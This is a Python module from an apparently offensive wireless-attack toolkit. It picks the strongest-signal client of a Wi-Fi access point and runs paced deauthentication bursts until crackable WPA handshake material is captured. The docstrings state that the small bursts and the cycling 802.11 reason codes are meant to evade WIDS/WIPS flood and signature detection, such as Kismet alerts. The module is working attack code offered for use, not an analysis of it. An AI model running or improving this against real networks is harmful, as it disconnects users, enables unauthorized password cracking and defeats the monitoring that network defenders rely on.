"""Client targeting and deauth-flow control shared by the attack chains.

Client selection and deauth pacing were previously duplicated ad hoc at
every call site (omni.py, gui/attack_runner.py, gui/app.py), all using
the same `next(iter(ap.clients), BROADCAST)` idiom -- an arbitrary pick
that ignores the per-client signal strength AccessPoint already tracks,
paired with a fixed multi-round burst loop that only stops on full
AUTHORIZED (M3) and otherwise always burns its whole round budget, even
after crackable CHALLENGE (M1+M2) material has already shown up. This
module centralizes both:

- select_client() picks the strongest-signal known client instead of an
  arbitrary set member.
- run_deauth_flow() sends small bursts and stops the moment
  HandshakeCapture reports ANY crackable material (not just AUTHORIZED),
  which is what actually cuts total deauth frames sent -- shrinking the
  burst size alone does not, since a fixed round count still runs to
  completion regardless of how few frames each round contains. This
  mirrors zizzania's (github.com/cyrus-and/zizzania) reactive model:
  deauth just enough to provoke a reconnect, then get out of the way.
"""

from __future__ import annotations

import time

from ..frames import BROADCAST
from ..scan import AccessPoint
from .handshake import HandshakeCapture

DEFAULT_BURST_SIZE = 4  # frames/round -- vs. deauth()'s own default of 64
DEFAULT_REASON_CODES = (7,)  # single-element == today's fixed reason code


def select_client(ap: AccessPoint) -> str:
    """Pick the best client to target for a directed deauth.

    Best = strongest recorded signal (AccessPoint.client_signal): a
    weak/marginal client is more likely to have already roamed or
    dropped off and won't reliably answer a directed deauth. Falls back
    to an arbitrary known client (no signal reading yet), then to
    BROADCAST if no client has been observed at all.
    """
    if ap.client_signal:
        return max(ap.client_signal, key=ap.client_signal.get)
    return next(iter(ap.clients), BROADCAST)


def _capture_has_material(cap: HandshakeCapture) -> bool:
    return any(cap.complete(a, c) for a, c in cap.messages)


def run_deauth_flow(
    deauth_fn,
    iface: str,
    ap: AccessPoint,
    client: str,
    cap: HandshakeCapture,
    *,
    max_rounds: int,
    round_interval: float,
    burst_size: int = DEFAULT_BURST_SIZE,
    reason_codes: tuple[int, ...] = DEFAULT_REASON_CODES,
    stop_event=None,
    progress_fn=None,
) -> bool:
    """Send deauth rounds against (ap, client), checking cap between
    every round and stopping as soon as it holds ANY crackable material
    (CHALLENGE or AUTHORIZED) -- not waiting for the full max_rounds
    budget the way a fixed loop does.

    cap must be the SAME HandshakeCapture instance the caller's sniffer
    is filling in real time (pass it into capture_handshake(..., cap=cap)
    -- see attacks/handshake.py), not one obtained only after the
    listener finishes. Passing a cap that nothing is concurrently
    mutating just means this loop runs the full max_rounds, same as
    before.

    burst_size caps frames per round well below deauth()'s own default
    of 64 -- large bursts are what tend to trip rate-based WIDS/flood
    detection (e.g. Kismet's trend alerts, or a WIPS's fixed
    deauth-per-second threshold); a handful of frames is normally
    enough to provoke a reconnect, and stopping the moment EAPOL shows
    up cuts total frames sent far more than shrinking the burst alone.

    reason_codes cycles the 802.11 reason code round to round instead
    of repeating one fixed value every time -- a minor extra layer
    against signature-based detection of a constant reason code.

    Returns True if cap already held crackable material when the loop
    ended (whether from a round or from stop_event/max_rounds), letting
    the caller skip logging a round that no longer needs one; the
    caller still inspects cap itself for the actual capture quality.
    """
    log = progress_fn or (lambda msg: None)
    for round_no in range(1, max_rounds + 1):
        if stop_event is not None and stop_event.is_set():
            return _capture_has_material(cap)
        if _capture_has_material(cap):
            log(f"handshake material already captured -- stopping deauth after {round_no - 1}/{max_rounds} round(s)")
            return True
        reason = reason_codes[(round_no - 1) % len(reason_codes)]
        sent = deauth_fn(iface, ap.bssid, client=client, count=burst_size, channel=ap.channel, reason=reason, progress_fn=log)
        if sent == 0:
            log(f"deauth round {round_no}/{max_rounds}: did NOT go out to {client}")
        else:
            log(f"deauth round {round_no}/{max_rounds}: sent {sent} frame(s) to {client} (reason={reason})")
        timed_out = stop_event.wait(round_interval) if stop_event is not None else _plain_wait(round_interval)
        if timed_out:
            return _capture_has_material(cap)
    return _capture_has_material(cap)


def _plain_wait(seconds: float) -> bool:
    """time.sleep() shaped like Event.wait() (always returns False) for
    callers that don't pass a stop_event."""
    time.sleep(seconds)
    return False
